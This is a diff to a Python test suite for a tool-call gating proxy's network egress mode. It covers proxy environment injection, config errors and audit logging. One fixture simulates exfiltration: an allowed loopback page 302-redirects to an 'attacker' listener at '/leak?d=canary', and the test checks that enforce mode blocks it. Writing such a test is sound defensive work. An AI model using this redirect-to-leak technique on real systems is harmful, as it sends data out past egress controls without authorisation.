@@ -334,3 +334,219 @@ def test_example_internal_api_policy_means_what_its_comments_say(tmp_path: Path)
     assert verdict("https://evil.test/") is ToolDecision.BLOCK
     other = evaluate_tool_call(policy, "fetch", "other_tool", {}, schema=schema)
     assert other.decision is ToolDecision.BLOCK  # default: block
+
+
+# --- network mode (design: network egress mode) ---------------------------------
+
+PROXY_NAMES = "HTTP_PROXY,HTTPS_PROXY,ALL_PROXY,NO_PROXY,NODE_USE_ENV_PROXY"
+
+
+def _network_policy(mode: str, egress: list[str] | None) -> str:
+    lines = [
+        "calibrated: false",
+        "on_detector_failure: escalate",
+        "detectors: {injection: [], redaction: [], inert: []}",
+        'state_dir: "state"',
+        f"network: {mode}",
+        "tool_calls:",
+        "  default: allow",
+    ]
+    if egress:
+        lines += ["  rules:", "    fake.fetch:", "      egress: " + json.dumps(egress)]
+    else:
+        lines += ["  rules: {}"]
+    return "\n".join(lines) + "\n"
+
+
+def _without_proxy_vars() -> dict[str, str]:
+    names = {"HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY", "TOOLGATE_CONFIG"}
+    return {k: v for k, v in os.environ.items() if k.upper() not in names}
+
+
+class _Sites:
+    """An allowed page that 302s to an attacker listener, both on loopback."""
+
+    def __init__(self) -> None:
+        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+        self.hits: list[str] = []
+        sites = self
+
+        class Attacker(BaseHTTPRequestHandler):
+            def do_GET(self) -> None:
+                sites.hits.append(self.path)
+                self.send_response(200)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+
+            def log_message(self, *args: object) -> None:
+                pass
+
+        self.attacker = ThreadingHTTPServer(("127.0.0.1", 0), Attacker)
+        self.attacker_port = self.attacker.server_address[1]
+        attacker_port = self.attacker_port
+
+        class Page(BaseHTTPRequestHandler):
+            def do_GET(self) -> None:
+                self.send_response(302)
+                self.send_header("Location", f"http://localhost:{attacker_port}/leak?d=canary")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+
+            def log_message(self, *args: object) -> None:
+                pass
+
+        self.page = ThreadingHTTPServer(("127.0.0.1", 0), Page)
+        self.page_port = self.page.server_address[1]
+        for server in (self.attacker, self.page):
+            threading.Thread(target=server.serve_forever, daemon=True).start()
+
+    def close(self) -> None:
+        for server in (self.attacker, self.page):
+            server.shutdown()
+            server.server_close()
+
+
+@pytest.fixture
+def sites() -> Any:
+    running = _Sites()
+    yield running
+    running.close()
+
+
+def _env_values(completed: subprocess.CompletedProcess[bytes], request_id: int) -> Any:
+    text = _replies(completed.stdout)[request_id]["result"]["content"][0]["text"]
+    return json.loads(text.split(" env=", 1)[1])
+
+
+class TestNetworkMode:
+    def _run(
+        self,
+        tmp_path: Path,
+        policy: str,
+        lines: list[bytes],
+        *server_args: str,
+        command: list[str] | None = None,
+        hold: bool = False,
+        **env: str,
+    ) -> subprocess.CompletedProcess[bytes]:
+        base = _without_proxy_vars()
+        base.update(env)
+        config = _write_policy(tmp_path, policy)
+        server = command or [sys.executable, str(FAKE_SERVER), *server_args]
+        argv = [sys.executable, "-m", "toolgate", "wrap", "--name", "fake",
+                "--config", str(config), "--", *server]  # fmt: skip
+        return _drive(argv, lines, env=base, cwd=tmp_path, hold_stdin_until_eof=hold)
+
+    def test_an_unknown_mode_is_a_config_error(self, tmp_path: Path) -> None:
+        marker = str(tmp_path / "marker")
+        completed = self._run(
+            tmp_path, _network_policy("on", ["docs.example.com"]), SESSION, "--marker", marker
+        )
+        assert completed.returncode == 1
+        assert "network must be one of off, audit, enforce" in completed.stderr.decode()
+        assert not (tmp_path / "marker").exists()
+
+    def test_a_parent_proxy_stops_wrap_before_the_child(self, tmp_path: Path) -> None:
+        completed = self._run(
+            tmp_path,
+            _network_policy("enforce", ["docs.example.com"]),
+            SESSION,
+            "--marker",
+            str(tmp_path / "marker"),
+            HTTPS_PROXY="http://corp.example:3128",
+        )
+        stderr = completed.stderr.decode()
+        assert completed.returncode == 1, stderr
+        assert "HTTPS_PROXY" in stderr and "upstream proxy" in stderr
+        assert not (tmp_path / "marker").exists()
+
+    def test_startup_line_and_child_environment(self, tmp_path: Path) -> None:
+        completed = self._run(
+            tmp_path,
+            _network_policy("enforce", ["docs.example.com"]),
+            [*SESSION[:3], _call(9, "echo", {})],
+            "--env",
+            PROXY_NAMES,
+            NO_PROXY="localhost",
+        )
+        stderr = completed.stderr.decode()
+        assert completed.returncode == 0, stderr
+        assert (
+            "toolgate[fake]: network mode: cooperative (enforce), allows 1 egress entries" in stderr
+        )
+        env = _env_values(completed, 9)
+        proxy = env["HTTP_PROXY"]
+        assert proxy.startswith("http://tg:") and "@127.0.0.1:" in proxy
+        assert env["HTTPS_PROXY"] == env["ALL_PROXY"] == proxy
+        assert env["NO_PROXY"] == "<unset>"
+        assert env["NODE_USE_ENV_PROXY"] == "1"
+        token = proxy.split("tg:", 1)[1].split("@", 1)[0]
+        assert len(token) >= 16 and token not in stderr
+
+    def test_the_tool_without_a_rule_is_named(self, tmp_path: Path) -> None:
+        completed = self._run(tmp_path, _network_policy("audit", ["docs.example.com"]), SESSION)
+        assert (
+            "toolgate[fake]: network mode also checks tools without an egress rule: echo"
+            in completed.stderr.decode()
+        )
+
+    def test_an_empty_union_allows_no_hosts(self, tmp_path: Path) -> None:
+        completed = self._run(tmp_path, _network_policy("enforce", None), SESSION[:3])
+        assert "network mode: cooperative (enforce), allows no hosts" in completed.stderr.decode()
+
+    def test_launcher_hint_when_the_child_exits_before_initialize(self, tmp_path: Path) -> None:
+        completed = self._run(
+            tmp_path,
+            _network_policy("enforce", ["docs.example.com"]),
+            SESSION[:1],
+            command=[sys.executable, "-c", "raise SystemExit(3)"],
+            hold=True,
+        )
+        stderr = completed.stderr.decode()
+        assert completed.returncode == 2, stderr
+        assert "the server exited before initialize with network mode on" in stderr
+        assert "uvx --offline" in stderr and "npx --offline" in stderr
+
+    def test_mode_off_leaves_the_environment_alone(self, tmp_path: Path) -> None:
+        completed = self._run(
+            tmp_path,
+            _network_policy("off", ["docs.example.com"]),
+            [*SESSION[:3], _call(9, "echo", {})],
+            "--env",
+            PROXY_NAMES,
+            NO_PROXY="localhost",
+        )
+        assert "network mode" not in completed.stderr.decode()
+        env = _env_values(completed, 9)
+        assert env["NO_PROXY"] == "localhost" and env["HTTP_PROXY"] == "<unset>"
+
+    @pytest.mark.parametrize("mode", ["enforce", "off"])
+    def test_the_redirect_is_refused_only_with_network_mode(
+        self, tmp_path: Path, sites: _Sites, mode: str
+    ) -> None:
+        page = f"http://localhost:{sites.page_port}/redirect"
+        policy = _network_policy(mode, [f"localhost:{sites.page_port}"])
+        completed = self._run(
+            tmp_path, policy, [*SESSION[:3], _call(9, "fetch", {"url": page})], "--fetch"
+        )
+        stderr = completed.stderr.decode()
+        assert completed.returncode == 0, stderr
+        text = _replies(completed.stdout)[9]["result"]["content"][0]["text"]
+        if mode == "off":
+            assert sites.hits == ["/leak?d=canary"], text
+            return
+        assert sites.hits == [], text
+        assert text == "status=403"
+        with sqlite3.connect(tmp_path / "state" / "audit" / "fake.sqlite") as db:
+            rows = db.execute(
+                "SELECT fused_decision, detector_scores, note FROM decision_log "
+                "WHERE outcome = 'network_egress' ORDER BY id"
+            ).fetchall()
+        decided = [(row[0], json.loads(row[1])) for row in rows]
+        assert [(d, s["destination"], s["divergence"]) for d, s in decided] == [
+            ("allow", f"localhost:{sites.page_port}", "matched"),
+            ("block", f"localhost:{sites.attacker_port}", "unmatched"),
+        ]
+        assert "is not in the egress union of server fake" in rows[1][2]
+        assert all("tg:" not in str(row) for row in rows)
